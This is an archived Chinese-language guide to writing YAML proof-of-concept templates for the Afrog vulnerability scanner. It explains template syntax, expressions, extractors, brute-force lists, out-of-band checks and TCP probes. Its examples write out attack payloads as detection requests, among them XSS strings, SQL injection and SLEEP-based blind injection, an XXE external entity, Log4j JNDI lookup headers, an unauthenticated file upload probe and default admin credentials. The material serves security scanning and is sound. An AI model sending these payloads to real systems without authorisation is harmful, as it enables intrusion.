> **历史归档**：本文内容已拆分为文档站的维护版本 —— [PoC 编写手册](zh/poc/01-quickstart.md)（`docs/zh/poc/`、`docs/en/poc/`）。此文件仅作历史留存，不再更新。

# Afrog POC 规则编写权威指南

<div style="display: flex; gap: 24px; align-items: flex-start;">
<!-- 左侧导航 -->
<nav style="min-width: 260px; max-width: 260px; background: #f8f9fa; border: 1px solid #e5e7eb; border-radius: 8px; padding: 16px; position: sticky; top: 16px;">
  <h2 style="margin-top: 0;">📚 目录导航</h2>
  <ul style="list-style: none; padding-left: 0; line-height: 1.6;">
    <li><a href="#前言">前言</a></li>
    <li><strong>🔧 基础语法</strong>
      <ul>
        <li><a href="#poc-基础结构">POC 基础结构</a></li>
        <li><a href="#info-信息定义">Info 信息定义</a></li>
        <li><a href="#set-变量定义">Set 变量定义</a></li>
        <li><a href="#rules-规则与request">Rules 规则与 Request</a></li>
        <li><a href="#expression-表达式">Expression 表达式</a></li>
        <li><a href="#extractors-数据提取器">Extractors 数据提取器</a></li>
      </ul>
    </li>
    <li><strong>⚡ 中级技巧</strong>
      <ul>
        <li><a href="#条件判断与组合">条件判断与组合</a></li>
        <li><a href="#变量作用域与引用">变量作用域与引用</a></li>
        <li><a href="#内置函数与使用限制">内置函数与使用限制</a></li>
        <li><a href="#请求与响应变量">请求与响应变量</a></li>
      </ul>
    </li>
    <li><strong>🚀 高级应用</strong>
      <ul>
        <li><a href="#多步骤规则组合">多步骤规则组合</a></li>
        <li><a href="#oob-盲注与外带检测">OOB 盲注与外带检测</a></li>
        <li><a href="#原始请求raw-http">原始请求 Raw HTTP</a></li>
        <li><a href="#tcp-协议检测">TCP 协议检测</a></li>
        <li><a href="#路径字典-brute">路径字典 Brute</a></li>
      </ul>
    </li>
    <li><strong>💡 实战案例</strong>
      <ul>
        <li><a href="#xss-反射型与存储型">XSS（反射型与存储型）</a></li>
        <li><a href="#sql-注入与时间盲注">SQL 注入与时间盲注</a></li>
        <li><a href="#文件上传与验证">文件上传与验证</a></li>
        <li><a href="#log4j-jndi-检测">Log4j JNDI 检测</a></li>
      </ul>
    </li>
    <li><strong>📖 附录</strong>
      <ul>
        <li><a href="#语法参考与字段清单">语法参考与字段清单</a></li>
        <li><a href="#内置函数清单">内置函数清单</a></li>
        <li><a href="#常见问题与最佳实践">常见问题与最佳实践</a></li>
      </ul>
    </li>
  </ul>
</nav>

<!-- 右侧内容 -->
<div style="flex: 1; min-width: 0;">

## 前言
Afrog 是一个基于 YAML 的漏洞检测框架，使用 POC（Proof of Concept）规则定义各类检测逻辑。本文档基于 Afrog 源码与官方 PoC 模板完整分析，覆盖从基础到高级的编写方法，所有示例均可直接复制使用，并严格遵循 Afrog 的语法与函数约束。

---

## 🔧 基础语法

### POC 基础结构
每个 POC 文件由顶级键组成：
- 顶级键：`id`、`info`、`set`、`rules`、`expression`
- 位置与缩进必须符合 YAML 规范（空格缩进，推荐 2 空格）

简单示例（结构演示）：
```yaml
id: demo-basic

info:
  name: 基础结构示例
  author: your-name
  severity: info

set:
  token: "abc123"

rules:
  r0:
    request:
      method: GET
      path: /status
    expression: response.status == 200

expression: r0()
```

实际应用示例（含头部与体）：
```yaml
id: demo-basic-headers-body

info:
  name: 基础结构（头体）
  author: your-name
  severity: low

set:
  ua: "Afrog/3.0"

rules:
  r0:
    request:
      method: POST
      path: /api/login
      headers:
        User-Agent: "{{ua}}"
        Content-Type: application/json
      body: '{"username":"admin","password":"admin"}'
    expression: response.status == 200 && response.body.bcontains(b"token")

expression: r0()
```

复杂组合示例（多规则 + 顶层表达式）：
```yaml
id: demo-basic-multi

info:
  name: 多规则基础结构
  author: your-name
  severity: medium

rules:
  ping:
    request:
      method: GET
      path: /ping
    expression: response.status == 200 && response.body.bcontains(b"pong")

  version:
    request:
      method: GET
      path: /version
    expression: response.status == 200 && "[0-9]+\\.[0-9]+".rmatches(response_text)

expression: ping() && version()
```

### Info 信息定义
字段与语义必须严格遵循 Afrog：
- 必填：`name`, `author`, `severity`
- 可选：`description`, `tags`, `created`, `reference`, `verified`, `requires`, `requires-mode`
- 严重级别：`critical | high | medium | low | info`

`requires`/`requires-mode` 用于声明 PoC 的指纹依赖（常用于弱口令/爆破类 PoC 的“先指纹后执行”流程）。详细说明与排障请参考：[requires 指纹门控：用法教程与问题答疑](requires-gating-guide.md)

简单示例：
```yaml
info:
  name: 站点可达性检查
  author: your-name
  severity: info
```

实际应用示例（描述、参考、标签）：
```yaml
info:
  name: Apache Struts2 RCE 检测
  author: your-name
  severity: critical
  description: 检测目标是否存在 Struts2 远程代码执行漏洞
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
  tags: struts,rce,apache
  created: 2024/01/01
```

复杂组合示例（验证标记、受影响版本说明）：
```yaml
info:
  name: WebLogic 反序列化检测
  author: your-name
  severity: high
  verified: true
  description: 检测 WebLogic WLS Security 组件反序列化漏洞
  reference:
    - https://www.oracle.com/security-alerts/
  tags: weblogic,deserialization,rce
  created: 2024/04/10
```

### Set 变量定义
`set` 用于定义可在 POC 中引用的变量。内置函数只能在 `set` 和 `expression` 中使用。

简单示例：
```yaml
set:
  username: admin
  password: admin
```

实际应用示例（动态随机与编码）：
```yaml
set:
  rboundary: randomLowercase(8)
  xss_payload: "<script>alert(1)</script>"
  xss_payload_encoded: urlencode(xss_payload)
```

复杂组合示例（组合多个工具函数）：
```yaml
set:
  randfile: randomLowercase(10)
  raw_token: "admin:password"
  token_b64: base64(raw_token)
  today: shortyear() + "-" + month() + "-" + day()
```

### Rules 规则与 Request
HTTP 请求字段：
- `method`：GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH
- `path`：请求路径（支持模板变量 `{{var}}`）
- `headers`：键值对
- `body`：字符串或多行文本（`|`）
- `follow_redirects`：是否跟随 3xx（可选）

简单示例（GET）：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /health
    expression: response.status == 200
```

实际应用示例（POST JSON 与头部）：
```yaml
rules:
  login:
    request:
      method: POST
      path: /api/login
      headers:
        Content-Type: application/json
      body: '{"user":"{{username}}","pass":"{{password}}"}'
    expression: response.status == 200 && response.body.bcontains(b"token")
```

复杂组合示例（Raw HTTP 原始请求，详见后文 Raw 章节）：
```yaml
rules:
  raw_req:
    request:
      raw: |
        GET /api/users HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
    expression: response.status == 200 && response.body.bcontains(b"users")
```

### Expression 表达式
Afrog 使用 CEL（Common Expression Language）表达式。
常用对象与函数：
- `response.status`, `response.body`, `response_text`, `response.headers`, `response.content_type`, `response.raw_header`, `response.latency`
- 文本匹配（推荐）：`contains`/`icontains`/`matches`/`rmatches`/`submatch`/`submatchall`
- 字节匹配：`bcontains`/`ibcontains`/`bmatches`/`bsubmatch`/`bsubmatchall` 等

最常见的迁移（解决“中文乱码/编码不一致导致提取失败”）：

1) 从响应体里做正则提取（提取变量）

旧写法（对 bytes 做正则）：
```yaml
'"(?P<title>.+)"'.bsubmatch(response.body)
```

新写法（对文本做正则，推荐）：
```yaml
'"(?P<title>.+)"'.submatch(response_text)
```

2) 从响应体里做正则判断（返回 True/False）

旧写法（对 bytes 做正则）：
```yaml
"root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
```

新写法（对文本做正则，推荐）：
```yaml
"root:.*?:[0-9]*:[0-9]*:".rmatches(response_text)
```

简单示例：
```yaml
expression: response.status == 200
```

实际应用示例（大小写不敏感包含与延迟判断）：
```yaml
expression: response.status == 200 && response.body.ibcontains(b"success") && response.latency < 3000
```

复杂组合示例（正则与多条件）：
```yaml
expression: |
  response.status == 200 &&
  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".rmatches(response_text) &&
  !response_text.icontains("error")
```

### Extractors 数据提取器
用于从响应中提取变量，供后续规则使用。

Output 方式：（推荐）

简单示例（正则提取单值）：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /profile
    expression: response.status == 200
    output:
      web_title: '"<title>(?P<webtitle>.+)</title>".submatch(response_text)'
  r1:
    request:
      method: GET
      path: /title={{web_title['webtitle']}}
    expression: response.status == 200
expression: r0() && r1()
```

实际应用示例（多值提取与引用）：
```yaml
rules:
  get_config:
    request:
      method: GET
      path: /api/config
    expression: response.status == 200
    output:
      web_title: '"<title>(?P<webtitle>.+)</title>".submatch(response_text)'
      web_cookie: '"Set-Cookie: (?P<webcookie>.+)".bsubmatch(response.raw_header)'

  use_key:
    request:
      method: GET
      path: /api/admin?title={{web_title['webtitle']}}
      headers:
        Cookie: "{{web_cookie['webcookie']}}"
    expression: response.status == 200 && response_text.icontains("admin")
```

动态多值提取并遍历验证（推荐搭配 `brute`）：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /api/templates
    expression: response.status == 200
    output:
      id_matches: '"\"id\":\"(?P<tid>[0-9]+)\"".bsubmatchall(response.body)'

  r1:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      template_id: id_matches["tid"]
    request:
      method: GET
      path: /api/check?id={{template_id}}
    expression: response.status == 200 && response_text.icontains("success")
expression: r0() && r1()
```

说明：
- `bsubmatchall/submatchall` 会返回 `map[string][]string`
- `id_matches["tid"]` 的结果是一个字符串列表
- `brute` 现在既支持 YAML 里直接写死的列表，也支持引用上一步动态提取出来的列表
- 如果只想拿第一个值，用 `submatch/bsubmatch`；如果要遍历全部值，用 `submatchall/bsubmatchall + brute`

Extractors 方式：

简单示例（正则提取单值）：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /profile
    expression: response.status == 200
    extractors:
      - type: regex
        extractor:
          web_title: '"<title>(?P<webtitle>.+)</title>".submatch(response_text)'
  r1:
    request:
      method: GET
      path: /title={{web_title['webtitle']}}
    expression: response.status == 200
expression: r0() && r1()
```

实际应用示例（多值提取与引用）：
```yaml
rules:
  get_config:
    request:
      method: GET
      path: /api/config
    expression: response.status == 200
    extractors:
      - type: regex
        extractor:
          web_title: '"<title>(?P<webtitle>.+)</title>".submatch(response_text)'
          web_cookie: '"Set-Cookie: (?P<webcookie>.+)".bsubmatch(response.raw_header)'

  use_key:
    request:
      method: GET
      path: /api/admin?title={{web_title['webtitle']}}
      headers:
        Cookie: "{{web_cookie['webcookie']}}"
    expression: response.status == 200 && response_text.icontains("admin")
```

---

## ⚡ 中级技巧

### 条件判断与组合
- 逻辑：`&&`, `||`, `!`
- 比较：`==`, `!=`, `>`, `<`, `>=`, `<=`

简单示例：
```yaml
expression: response.status == 200 || response.status == 302
```

实际应用示例（组合判断）：
```yaml
expression: response.status == 200 && response.body.bcontains(b"dashboard")
```

复杂组合示例（嵌套与正则）：
```yaml
expression: (response.status == 200 && response.body.bcontains(b"SUCCESS")) || (response.status >= 500 && response.body.ibcontains(b"exception"))
```

### 变量作用域与引用
- `set` 定义的变量在整个 POC 中可引用：`{{var}}`
- 从 `extractors`、`output` 提取的变量同样可在后续规则中引用

### 内置函数与使用限制
依据源码与官方约定：
- 常用函数：`randomLowercase`, `randomInt`, `base64`, `base64Decode`, `urlencode`, `urldecode`, `md5`, `hexdecode`, `toUpper`, `toLower`, `substr`, `replaceAll`, `printable`, `faviconHash`, `versionCompare`, `ysoserial`, `aesCBC`, `repeat`, `decimal`, `length`, `timestamp_second`, `year`, `shortyear`, `month`, `day`, `oobCheck`, `oobEvidence`, `wait`, `jndi`, `sleep`

示例：
```yaml
set:
  q_raw: "<script>alert(1)</script>"
  q: urlencode(q_raw)

rules:
  r0:
    request:
      method: GET
      path: /search?q={{q}}
    expression: response.status == 200 && response.body.bcontains(b"search")
```

### 请求与响应变量
- 请求变量（只读）：`request.url`, `request.url.host`, `request.url.path`, `request.url.query`
- 响应变量：
  - `response.body`：响应体 bytes（适合 `bcontains/bmatches/bsubmatch` 等字节函数）
  - `response_text`：响应体文本 string（按响应的 charset 尝试解码，适合中文与正则提取，推荐用于 `icontains/rmatches/submatch`）
  - `response.status`, `response.headers`, `response.content_type`, `response.raw_header`, `response.latency`, `response.raw`（字节流）

---

## 🚀 高级应用

### 多步骤规则组合
注意：
- 每个规则的 `expression` 必须独立判断，不能依赖前一个规则的结果。
- 最后一个规则的 `expression` 通常用于判断最终结果。
- `POST` 请求中，如果不指定 `Content-Type `的话，默认自动添加 `Content-Type: application/x-www-form-urlencoded` 头部。


简单示例（两步组合）：
```yaml
id: steps-demo
info:
  name: 两步组合
  author: your-name
  severity: medium

rules:
  step1:
    request:
      method: GET
      path: /login
    expression: response.status == 200 && response_text.icontains("csrf_token")

  step2:
    request:
      method: POST
      path: /login
      body: "username=admin&password=admin"
    expression: response.status == 302

expression: step1() && step2()
```

### OOB 盲注与外带检测
Afrog 支持 OOB（Out-of-Band）交互检测，常用于 DNS/HTTP 外带验证。

实际应用示例（DNS OOB）：
```yaml
id: blind-xxe-oob
info:
  name: 盲 XXE OOB 检测
  author: your-name
  severity: high

rules:
  r0:
    request:
      method: POST
      path: /xml-endpoint
      headers:
        Content-Type: application/xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY % remote SYSTEM "http://{{oob.DNS}}">
          %remote;
        ]>
        <root>test</root>
    expression: oobCheck(oob.ProtocolDNS, 5)

expression: r0()
```

复杂组合示例（JNDI 注入头）：
```yaml
id: jndi-header-oob
info:
  name: JNDI 注入 OOB 检测
  author: your-name
  severity: critical

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}}"
    expression: oobCheck(oob.ProtocolDNS, 5)

expression: r0()
```

### 原始请求 Raw HTTP
适用于复杂 HTTP 报文（如多段、升级、特别头部顺序等）。
```yaml
rules:
  raw_req:
    request:
      type: http
      raw: |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Version: 13
    expression: response.status == 101 && response.raw_header.ibcontains(b"upgrade")
```

### TCP 协议检测
用于识别网络服务特征（如数据库）。
```yaml
id: tcp-detect
info:
  name: TCP 服务识别
  author: your-name
  severity: info

rules:
  mysql:
    request:
      type: tcp
      host: "{{Hostname}}"
      port: 3306
      data: "\n"
    expression: response.raw.ibcontains(b"mysql") || response.raw.ibcontains(b"mariadb")

expression: mysql()
```

### 路径字典 Brute
`brute` 用于让某条规则按一组候选值重复执行，常见于路径探测、用户名密码组合、动态提取 ID 后逐个验证等场景。

常用字段：
- `mode`：迭代模式，支持 `clusterbomb` 和 `pitchfork`
- `commit`：命中后变量如何保留，常用值有 `winner`、`first`、`last`、`none`
- `continue`：命中后是否继续遍历，`false` 表示命中即停，`true` 表示继续跑完整个列表

最小写法的默认值：
如果你只写 payload 变量，没有显式写 `mode`、`commit`、`continue`，默认等价于：

```yaml
brute:
  mode: clusterbomb
  commit: winner
  continue: false
  p:
    - /
    - /jeecg-boot
```

这表示：
- 默认按 `clusterbomb` 方式遍历
- 命中后保留第一组命中的变量、请求和响应
- 默认命中即停，不再继续尝试后续 payload
- 如果只有一个变量，例如 `p`，实际效果就是按列表顺序一个个执行

`commit` 取值说明：
- `winner`：保留第一组命中的变量、请求和响应。如果后面继续命中，最终仍保留第一次命中的结果
- `first`：当前实现与 `winner` 等价，也就是保留第一组命中的结果
- `last`：如果存在多次命中，保留最后一次命中的变量、请求和响应
- `none`：不保留 brute 变量本身，但保留命中的请求和响应，适合“只关心是否命中，不想把枚举值带到后续规则”的场景

`commit` 与 `continue` 组合理解：
- `commit: winner/first` + `continue: false`：命中即停，保留当前这次命中结果
- `commit: winner/first` + `continue: true`：继续遍历，但最终保留第一次命中结果
- `commit: last` + `continue: true`：继续遍历，最终保留最后一次命中结果
- `commit: none`：无论是否继续遍历，都不会把 brute 变量提交到全局变量里

静态列表示例：
```yaml
rules:
  r0:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      user:
        - admin
        - test
        - guest
    request:
      method: GET
      path: /?user={{user}}
    expression: response.status == 200 && response_text.icontains("welcome")
expression: r0()
```

动态列表示例（配合 `output`）：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /api/templates
    expression: response.status == 200
    output:
      id_matches: '"\"id\":\"(?P<tid>[0-9]+)\"".bsubmatchall(response.body)'

  r1:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      template_id: id_matches["tid"]
    request:
      method: GET
      path: /api/check?id={{template_id}}
    expression: response.status == 200 && response_text.icontains("success")
expression: r0() && r1()
```

说明：
- 旧用法仍然有效：`brute` 依然支持 YAML 里直接写死列表
- 新增能力：`brute` 也支持引用运行期表达式结果，只要最终能求值为字符串列表即可
- `clusterbomb` 适合笛卡尔积遍历，`pitchfork` 适合按索引一一配对遍历
- `winner` 和 `first` 目前是同义配置
- 如果只需要单个值，不必使用 `brute`

---

## 💡 实战案例

### XSS（反射型与存储型）
简单示例（反射型）：
```yaml
id: xss-reflect
info:
  name: 反射型 XSS 检测
  author: your-name
  severity: medium

set:
  payload_raw: "<script>alert(1)</script>"
  payload: urlencode(payload_raw)

rules:
  r0:
    request:
      method: GET
      path: /search?q={{payload}}
    expression: response.status == 200 && response.body.bcontains(bytes(payload_raw))

expression: r0()
```

实际应用示例（存储型）：
```yaml
id: xss-stored
info:
  name: 存储型 XSS 检测
  author: your-name
  severity: medium

set:
  c_raw: "<img src=x onerror=alert(1)>"
  c: urlencode(c_raw)

rules:
  submit:
    request:
      method: POST
      path: /comment
      body: "name=test&comment={{c}}"
    expression: response.status == 200

  verify:
    request:
      method: GET
      path: /comments
    expression: response.status == 200 && response.body.bcontains(bytes(c_raw))

expression: submit() && verify()
```

### SQL 注入与时间盲注
简单示例（数字型）：
```yaml
id: sqli-num
info:
  name: 数字型 SQL 注入
  author: your-name
  severity: high

set:
  rid: randomInt(10000, 99999)

rules:
  r0:
    request:
      method: GET
      path: /product?id={{rid}} AND 1=1
    expression: response.status == 200 && response.body.ibcontains(b"product")

expression: r0()
```

实际应用示例（字符型）：
```yaml
id: sqli-str
info:
  name: 字符型 SQL 注入
  author: your-name
  severity: high

rules:
  r0:
    request:
      method: GET
      path: /search?q=test' AND '1'='1
    expression: response.status == 200 && response.body.ibcontains(b"search results")

expression: r0()
```

复杂组合示例（时间盲注）：
```yaml
id: sqli-time
info:
  name: 时间盲注
  author: your-name
  severity: high

rules:
  r0:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r1:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000
  r2:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r3:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000

expression: r0() && r1() && r2() && r3()
```

### 文件上传与验证
实际应用示例（multipart 上传 + 路径访问验证）：
```yaml
id: upload-verify
info:
  name: 文件上传与验证
  author: your-name
  severity: high

set:
  rfilename: randomLowercase(20)
  rbody: randomLowercase(32)
  rboundary: randomLowercase(8)
rules:
  upload:
    request:
      method: POST
      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="File1";filename="{{rfilename}}.html"
        Content-Type: image/jpeg

        {{rbody}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.status == 200
  verify:
    request:
      method: GET
      path: /tplus/SM/SetupAccount/images/{{rfilename}}.html
    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
expression: upload() && verify()
```

### Log4j JNDI 检测
实际应用示例（参考官方模板）：
```yaml
id: log4j-jndi-check
info:
  name: Log4j JNDI 检测
  author: your-name
  severity: critical

rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}}"
    expression: oobCheck(oob.ProtocolDNS, 5)

expression: r0()
```

---

## 📖 附录

### 语法参考与字段清单
- 顶级键：`id`, `info`, `set`, `rules`, `expression`
- `info` 字段：`name`, `author`, `severity`, `description`, `tags`, `created`, `reference`, `verified`, `requires`, `requires-mode`
- HTTP 请求：`method`, `path`, `headers`, `body`, `follow_redirects`
- Raw HTTP：`raw`
- TCP 请求：`type: tcp`, `host`, `port`, `data`
- 变量引用：`{{var}}`
- 请求变量：`request.url`, `request.url.host`, `request.url.path`, `request.url.query`
- 响应变量：`response.status`, `response.body`, `response_text`, `response.headers`, `response.content_type`, `response.raw_header`, `response.latency`, `response.raw`

### 内置函数清单（常用）
- 编码与转换：`base64`, `base64Decode`, `urlencode`, `urldecode`, `md5`, `hexdecode`, `toUpper`, `toLower`, `substr`, `replaceAll`, `printable`, `faviconHash`, `decimal`, `length`
- 随机与时间：`randomLowercase`, `randomInt`, `timestamp_second`, `year`, `shortyear`, `month`, `day`, `sleep`, `wait`, `repeat`
- 安全与协议：`versionCompare`, `ysoserial`, `aesCBC`, `jndi`, `oobCheck`, `oobEvidence`


### 常见问题与最佳实践
- 表达式错误：
  - 使用 `==` 而非 `=`
  - 合理使用逻辑运算符（`&&`、`||`、`!`）
- 高成本 PoC 执行收敛：
  - 弱口令/爆破/默认口令建议使用 `requires`/`requires-mode: strict`，实现“先指纹后执行”，参考：[requires 指纹门控：用法教程与问题答疑](requires-gating-guide.md)
- 空值防护：
  ```yaml
  expression: response.headers["server"] != "" && response.headers["server"].icontains("server")
  ```
- OOB 交互：
  - `{{oob.DNS}}` / `{{oob.HTTP}}` + `oobCheck(protocol, timeout)`（推荐：dns=5、http=3；无需 `set: oob: oob()`）
  - 命中时可用 `oobEvidence()` 获取证据摘要（终端与报告会展示 `oob_evidence`）
- 正则转义：
  - 在 YAML 字符串中需双反斜杠 `\\` 表示单个反斜杠
- 与官方一致的术语：
  - 严重性：`critical|high|medium|low|info`
  - 字节判断：`bcontains|ibcontains|bmatches|bsubmatch` 等
  - 文本判断：`contains|icontains|matches|rmatches|submatch` 等

---

## 结语
通过上述从基础到高级的系统讲解，你可以快速编写可执行、稳定且低误报的 Afrog POC。建议在开发时参考本指南与现有 `pocs/afrog-pocs/` 模板，保持语法与函数使用的一致性。Happy Hunting! 🎯

</div>
</div>
